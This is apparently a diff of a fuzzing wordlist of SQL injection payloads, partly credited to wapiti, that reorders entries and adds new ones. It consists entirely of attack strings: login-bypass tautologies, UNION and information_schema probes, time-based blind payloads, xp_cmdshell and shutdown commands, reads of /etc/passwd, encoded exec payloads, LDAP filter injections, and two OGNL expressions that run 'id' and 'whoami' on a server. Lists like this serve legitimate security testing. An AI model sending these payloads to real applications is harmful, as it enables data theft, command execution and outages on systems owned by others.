@@ -1,108 +1,260 @@
- --
+¡® or 1=1 --
+Ã½ or 1=1 --
+â or 1=1 --
+ý or 1=1 --
+�� or 1=1 --
+¡® or 3=3 --
+â or 3=3 --
+ý or 3=3 --
+�� or 3=3 --
+-
+--
+-- &password=
+--';
+--sp_password
+,@variable
+; begin declare @var varchar(8000) set @var=' ...
+; exec ('sel' + 'ect us' + 'er')
+; exec master..xp_cmdshell
+; exec master..xp_cmdshell 'ping 172.10.1.255'--
+; exec xp_regread
+; execute immediate 'sel' || 'ect us' || 'er'
+; or '1'='1'
+;waitfor delay '0:0:__TIME__'--
 !
-"
-#
-&
+?
 '
 ' --
 ' ;
+' (select top 1
+' and '' like '
+' AnD '' like '
+' and '' like ''--
+' and '' like '%
+' aND '' like '%
+' and 2>1--
+' and 2>3--
+' or '' like '
+' or ''='
+' or '1'='1'--
+' or 'x'='x
+' or (EXISTS)
+' or 0=0 --
+' or 0=0 #
+' or 1 --'
+' or 1=1
+' or 1=1 or ''='
+' or 1=1--
+' or 3=3
+' or a=a--
+' or uid like '%
+' or uname like '%
+' or user like '%
+' or userid like '%
+' or username like '%
+' UNION ALL SELECT
+' UNION SELECT
+'; exec master..xp_cmdshell
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--
+'; exec xp_regread
+';shutdown--
+''
+''asdasd'='asdr'-- #/*
+''asdasd'='asdr'--%20#/*
+') and ('x'='x
+') or ('a'='a
+') or ('x'='x
+')%20or%20('x'='x
+')or('a'='a
+'%20or%20''='
+'%20or%20'x'='x
+'%20or%201=1
+'%2B'
+'%2B'0
+'%2B'1
+'='
+'||'
+'||1-- #/*
+'||1--%20#/*
+'||UTL_HTTP.REQUEST
+'|0-- #/*
+'|0--%20#/*
+'|1-- #/*
+'|1--%20#/*
+'and't'='d
+'and't'='t
+'and(select*from(select+sleep(5))a/**/union/**/select+1)='
+'hi' or 'x'='x';
+'OR 1=1
+'or 1=1--
+'or 1=1/*
+'or FaLsE|tRuE-- #/*
+'or select *
+'or''/**/'0'<'1'-- #/*
+'or''/**/'0'<'1'--%20#/*
+'or''='
+'or'='or'
+'or'a'='a
+'or't'='t
+'or"="'a'<'s
+'or/**/FaLsE|tRuE-- #/*
+'or/**/FaLsE|tRuE--%20#/*
+'or%20FaLsE|tRuE--%20#/*
+'sqlattempt1
+'xor
+"
+" or "a"="a
+" or "x"="x
+" or 0=0 --
+" or 0=0 #
+" or 1=1 or ""="
+" or 1=1--
+" or benchmark(10000000,MD5(1))#
+" or isNULL(1/0) /*
+" or pg_sleep(__TIME__)--
+" or sleep(__TIME__)#
+";waitfor delay '0:0:__TIME__'--
+"' or 1 --'"
+") or ("a"="a
+") or benchmark(10000000,MD5(1))#
+") or pg_sleep(__TIME__)--
+") or sleep(__TIME__)="
+");waitfor delay '0:0:__TIME__'--
+")) or benchmark(10000000,MD5(1))#
+")) or pg_sleep(__TIME__)--
+")) or sleep(__TIME__)="
+"));waitfor delay '0:0:__TIME__'--
+"a"" or 1=1--"
+"a"" or 3=3--"
+"hi"") or (""a""=""a"
+"or "a"="a
+"or 1=1
+"or 1=1--
+"or"="a'='a
 (
+(||6)
+(select top 1
+(sqlattempt2)
+(sqlvuln)
 )
+) and (1=1
+) or ('a'='a
+) or (a=a
+) or benchmark(10000000,MD5(1))#
+) or pg_sleep(__TIME__)--
+) or sleep(__TIME__)='
+) union select * from information_schema.tables;
+);waitfor delay '0:0:__TIME__'--
+)) or benchmark(10000000,MD5(1))#
+)) or pg_sleep(__TIME__)--
+)) or sleep(__TIME__)='
+));waitfor delay '0:0:__TIME__'--
+)%20or%20('x'='x
+@var select @var as var into temp end --
+@variable
+*(|(mail=*))
+*(|(objectclass=*))
 */*
 *|
--
---
---';
 /
+/**/or/**/1/**/=/**/1
 //
 //*
+\x23
+\x27
+\x27\x4F\x52 SELECT *
+\x27\x6F\x72 SELECT *
+\x27UNION SELECT
+\x3D \x27
+\x3D \x3B'
+&
+&apos;%20OR
+&lt;&gt;&quot;'%;)(&amp;+
+#
+# from wapiti
+%20'='
+%20'sleep%2050'
+%20$(sleep%2050)
+%20and%20(select%20/**/if('360'='360',/**/sleep(5),123))
+%20or%20''='
+%20or%20'x'='x
+%20or%201=1
+%20or%20360=360
+%20or%20x=x
+%21
+%26
+%27%20or%201=1
+%28
+%29
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%28%7C%28objectclass%3D%2A%29%29
+%2A%7C
+%7C
+%df' and sleep(5)%23
+%df'%20and%20sleep(5)%23
++sqlvuln
 <>"'%;)(&+
-= '
 = --
 = ;
-?
+= '
+>FaLsE -- #/*
+>FaLsE%20--%20#/*
 |
+||'6
+||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+||1-- #/*
+||1--%20#/*
+||6
+||UTL_HTTP.REQUEST
+|0-- #/*
+|0--%20#/*
 0
 0 or 1=1
 0x730065006c0065006300740020004000400076006500 ...
 0x770061006900740066006F0072002000640065006C00 ...
 0x77616974666F722064656C61792027303A303A313027 ...
-1;(load_file(char(47,101,116,99,47,112,97,115, ...
-1 or 1=1
-1'or'1'='1
-1 or '1'='1'=1
 1 or '1'='1' or 1=1
+1 or '1'='1'=1
+1 or 1=1
 1 or benchmark(10000000,MD5(1))#
-1) or benchmark(10000000,MD5(1))#
-1)) or benchmark(10000000,MD5(1))#
 1 or pg_sleep(__TIME__)--
-1) or pg_sleep(__TIME__)--
-1)) or pg_sleep(__TIME__)--
 1 or sleep(__TIME__)#
-1) or sleep(__TIME__)#
-1)) or sleep(__TIME__)#
-1;SELECT%20*
 1 waitfor delay '0:0:10'--
-%20$(sleep%2050)
-%20or%20''='
-'%20or%20''='
-%20or%201=1
-'%20or%201=1
-%20or%20'x'='x
-%20or%20x=x
-'%20or%20'x'='x
-')%20or%20('x'='x
-)%20or%20('x'='x
-%20'sleep%2050'
-%21
+1;(load_file(char(47,101,116,99,47,112,97,115, ...
+1;SELECT%20*
+1'or'1'='1
+1'or+1=1--+
+1) or benchmark(10000000,MD5(1))#
+1) or pg_sleep(__TIME__)--
+1) or sleep(__TIME__)#
+1)) or benchmark(10000000,MD5(1))#
+1)) or pg_sleep(__TIME__)--
+1)) or sleep(__TIME__)#
 21 %
 23 OR 1=1
-%26
 26 %
-%27%20or%201=1
-%28
 28 %
-%29
 29 %
-%2A%28%7C%28mail%3D%2A%29%29
-%2A%28%7C%28objectclass%3D%2A%29%29
-%2A%7C
 3.10E+17
-(||6)
-||'6
-||6
-%7C
 a'
-Ã½ or 1=1 --
-admin'--
-admin' or '
-) and (1=1
- and 1=( if((load_file(char(110,46,101,120,11 ...
- and 1 in (select var from temp)--
-' and 2>1--
-' and 2>3--
-' and '' like '
-' and '' like '%
-' and '' like ''--
-' aND '' like '%
-' AnD '' like '
-') and ('x'='x
-anything' OR 'x'='x
-"a"" or 1=1--"
-a' or 1=1--
-a'or' 1=1--
-â or 1=1 --
-"a"" or 3=3--"
-a' or 3=3--
-â or 3=3 --
 a' or 'a' = 'a
-&apos;%20OR
-as
-asc
+a' or 1=1--
+a' or 3=3--
 a' waitfor delay '0:0:10'--
-; begin declare @var varchar(8000) set @var=' ...
+a'or' 1=1--
+aaaaaaaaaa${(#cl=@Thread@currentThread().getContextClassLoader()).getClass().getMethods()[19].invoke(#cl,null).getClass().getMethods()[5].invoke(#cl,\"javax\"+\".\"+\"script\"+\".\"+\"ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"var%20p%20=%20\"+\"java\"+\".\"+\"lang\"+\".\"+\"Runtime\"+\".\"+\"getRuntime().exec('id');var%20sc%20=%20new%20\"+\"java\"+\".\"+\"util\"+\".\"+\"Scanner(\"+\"p\"+\".\"+\"getInputStream(),'GBK').useDelimiter('\\\\A');var%20result%20=%20\"+\"sc\"+\".\"+\"hasNext()%20?%20\"+\"sc\"+\".\"+\"next()%20:%20'';\"+\"sc\"+\".\"+\"close();result;\")}bbbbbbb
+aaaaaaaaaa${(#cl=@Thread@currentThread().getContextClassLoader()).getClass().getMethods()[19].invoke(#cl,null).getClass().getMethods()[5].invoke(#cl,\"javax\"+\".\"+\"script\"+\".\"+\"ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"var%20p%20=%20\"+\"java\"+\".\"+\"lang\"+\".\"+\"Runtime\"+\".\"+\"getRuntime().exec('whoami');var%20sc%20=%20new%20\"+\"java\"+\".\"+\"util\"+\".\"+\"Scanner(\"+\"p\"+\".\"+\"getInputStream(),'GBK').useDelimiter('\\\\A');var%20result%20=%20\"+\"sc\"+\".\"+\"hasNext()%20?%20\"+\"sc\"+\".\"+\"next()%20:%20'';\"+\"sc\"+\".\"+\"close();result;\")}bbbbbbb
+admin' or '
+admin'--
+admin'-- #/*
+admin'--%20#/*
+admin'or/**/FaLsE|tRuE-- #/*
+admin'or/**/FaLsE|tRuE--%20#/*
+and (select /**/if('360'='360',/**/sleep(5),123))
+and 1 in (select var from temp)--
+and 1=( if((load_file(char(110,46,101,120,11 ...
+anything' OR 'x'='x
 benchmark(10000000,MD5(1))#
-bfilename
 char%4039%41%2b%40SELECT
 declare @q nvarchar (200) 0x730065006c00650063 ...
 declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
@@ -111,219 +263,82 @@ declare @q nvarchar (200) select @q = 0x770061006900740066006F007200200064006500
 declare @q nvarchar (4000) select @q =
 declare @s varchar (200) select @s = 0x73656c6 ...
 declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
+declare @s varchar (8000) select @s = 0x73656c ...
 declare @s varchar(200) select @s = 0x77616974 ...
 declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)
 declare @s varchar(22) select @s =
-declare @s varchar (8000) select @s = 0x73656c ...
-delete
-desc
-distinct
-||(elt(-3+5,bin(15),ord(10),hex(char(45))))
-'; exec master..xp_cmdshell
-; exec master..xp_cmdshell
-'; exec master..xp_cmdshell 'ping 172.10.1.255'--
-; exec master..xp_cmdshell 'ping 172.10.1.255'--
 exec(@s)
-; exec ('sel' + 'ect us' + 'er')
-exec sp
-; execute immediate 'sel' || 'ect us' || 'er'
-exec xp
-'; exec xp_regread
-; exec xp_regread
-# from wapiti
- group by userid having 1=1--
-handler
-having
- having 1=1--
+group by userid having 1=1--
+having 1=1--
 hi or 1=1 --"
-hi" or 1=1 --
-hi' or 1=1 --
-"hi"") or (""a""=""a"
 hi or a=a
-hi" or "a"="a
-hi") or ("a"="a
 hi' or 'a'='a
-hi') or ('a'='a
-'hi' or 'x'='x';
 hi' or 'x'='x';
-insert
-like
-limit
-&lt;&gt;&quot;'%;)(&amp;+
-*(|(mail=*))
-*(|(objectclass=*))
- or ''='
-' or ''='
-'or''='
+hi' or 1=1 --
+hi') or ('a'='a
+hi" or "a"="a
+hi" or 1=1 --
+hi") or ("a"="a
 or
- or 0=0 #
- or 0=0 #"
- or 0=0 --
-" or 0=0 #
-" or 0=0 --
-' or 0=0 #
-' or 0=0 --
+or ''='
+or '1'='1
+or '1'='1'--
+or '7659'='7659
+or 'a'='a
+or 'something' = 'some'+'thing'
+or 'text' = n'text'
+or 'text' > 't'
+or 'unusual' = 'unusual'
+or 'whatever' in ('whatever')
+or (EXISTS)
+or 0=0 --
 or 0=0 #
 or 0=0 #"
-or 0=0 --
- or 1 --'
- or 1/*
-"' or 1 --'"
-' or 1 --'
- or 1=1 --
- or '1'='1
- or '1'='1'--
- or 1=1
- or 1=1 /*
- or 1=1--
-" or 1=1--
-"or 1=1
-"or 1=1--
-' or '1'='1'--
-' or 1=1
-' or 1=1--
-'or 1=1--
-'or 1=1/*
-/**/or/**/1/**/=/**/1
-; or '1'='1'
-¡® or 1=1 --
+or 1 --'
+or 1 in (select @@version)--
+or 1/*
 or 1=1
-or 1=1--
-'OR 1=1
- or 1=1 or ""=
- or 1=1 or ''='
-" or 1=1 or ""="
-' or 1=1 or ''='
+or 1=1 --
+or 1=1 /*
+or 1=1 or ''='
 or 1=1 or ""=
- or 1 in (select @@version)--
-or%201=1
-or%201=1 --
- or 2 > 1
- or 2 between 1 and 3
- or 3=3 --
- or 3=3
-' or 3=3
-¡® or 3=3 --
- or '7659'='7659
- or 'a'='a
- or a = a
- or a=a
- or a=a--
-" or "a"="a
-") or ("a"="a
-"or "a"="a
-"or"="a'='a
-' or a=a--
-') or ('a'='a
-')or('a'='a
-'or'a'='a
-) or ('a'='a
-) or (a=a
+or 1=1--
+or 2 > 1
+or 2 between 1 and 3
+or 3=3
+or 3=3 --
+or 360=360
 or a = a
 or a=a
- or benchmark(10000000,MD5(1))#
-" or benchmark(10000000,MD5(1))#
-") or benchmark(10000000,MD5(1))#
-")) or benchmark(10000000,MD5(1))#
-) or benchmark(10000000,MD5(1))#
-)) or benchmark(10000000,MD5(1))#
-order by
- or (EXISTS)
-' or (EXISTS)
-" or isNULL(1/0) /*
+or a=a--
+or benchmark(10000000,MD5(1))#
 or isNULL(1/0) /*
-' or '' like '
-'or'='or'
- or pg_sleep(__TIME__)--
-" or pg_sleep(__TIME__)--
-") or pg_sleep(__TIME__)--
-")) or pg_sleep(__TIME__)--
-) or pg_sleep(__TIME__)--
-)) or pg_sleep(__TIME__)--
-'or select *
- or sleep(__TIME__)#
- or sleep(__TIME__)='
-" or sleep(__TIME__)#
-") or sleep(__TIME__)="
-")) or sleep(__TIME__)="
-) or sleep(__TIME__)='
-)) or sleep(__TIME__)='
- or 'something' = 'some'+'thing'
- or 'text' = n'text'
- or 'text' > 't'
-' or uid like '%
-' or uname like '%
- or 'unusual' = 'unusual'
-' or userid like '%
-' or user like '%
-' or username like '%
- or username like char(37);
- or 'whatever' in ('whatever')
-" or "x"="x
-' or 'x'='x
-') or ('x'='x
- -- &password=
+or pg_sleep(__TIME__)--
+or sleep(__TIME__)#
+or sleep(__TIME__)='
+or username like char(37);
+or%201=1
+or%201=1 --
+order by
 password:*/=1--
 pg_sleep(__TIME__)--
-PRINT
 PRINT @@variable
-procedure
-replace
-select
- select * from information_schema.tables--
- select name from syscolumns where id = (sele ...
- (select top 1
-' (select top 1
-';shutdown--
---sp_password
-'sqlattempt1
-(sqlattempt2)
-(sqlvuln)
-+sqlvuln
-sqlvuln
-sqlvuln;
+select * from information_schema.tables--
+select name from syscolumns where id = (sele ...
 t'exec master..xp_cmdshell 'nslookup www.googl ...
 t'exec master..xp_cmdshell 'nslookup www.google.com'--
 to_timestamp_tz
-truncate
 tz_offset
- UNION ALL SELECT
-' UNION ALL SELECT
- union all select @@version--
- union select
 uni/**/on sel/**/ect
- UNION SELECT
-' UNION SELECT
- union select 1,load_file('/etc/passwd'),1,1,1;
-) union select * from information_schema.tables;
- union select * from users where login = char ...
-update
-'||UTL_HTTP.REQUEST
-||UTL_HTTP.REQUEST
-,@variable
-@variable
-@var select @var as var into temp end --
-"));waitfor delay '0:0:__TIME__'--
-");waitfor delay '0:0:__TIME__'--
-";waitfor delay '0:0:__TIME__'--
-));waitfor delay '0:0:__TIME__'--
-);waitfor delay '0:0:__TIME__'--
-;waitfor delay '0:0:__TIME__'--
-\x23
-\x27
-\x27UNION SELECT
-\x27\x4F\x52 SELECT *
-\x27\x6F\x72 SELECT *
-\x3D \x27
-\x3D \x3B'
+UNION ALL SELECT
+union all select @@version--
+union select
+UNION SELECT
+union select * from users where login = char ...
+union select 1,load_file('/etc/passwd'),1,1,1;
 x' AND 1=(SELECT COUNT(*) FROM tabname); --
 x' AND email IS NULL; --
 x' AND members.email IS NULL; --
 x' AND userid IS NULL; --
-'xor
 x' or 1=1 or 'x'='y
 x' OR full_name LIKE '%Bob%
-ý or 1=1 --
-ý or 3=3 --
-�� or 1=1 --
-�� or 3=3 --
